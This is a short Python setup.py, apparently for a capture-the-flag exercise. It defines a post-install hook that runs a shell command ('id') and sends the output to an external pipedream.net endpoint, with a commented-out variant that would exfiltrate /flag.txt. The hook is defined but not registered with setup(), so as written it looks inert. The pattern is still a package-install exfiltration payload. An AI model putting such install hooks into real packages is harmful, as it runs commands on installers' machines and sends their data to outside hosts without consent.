from setuptools import setup
import os
from setuptools.command.install import install

setup(
    name='ctf-q21-empire-tmp-bw13434',
    description='Bye world',
    version='0.0.9',
    packages=['main'],
    install_requires=[
      'requests',
    ],
    )

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION
        import requests
        requests.get("https://ene63d9dv33i6ch.m.pipedream.net/?hehe="+os.popen("id").read()) #cat /flag.txt | base64").read())
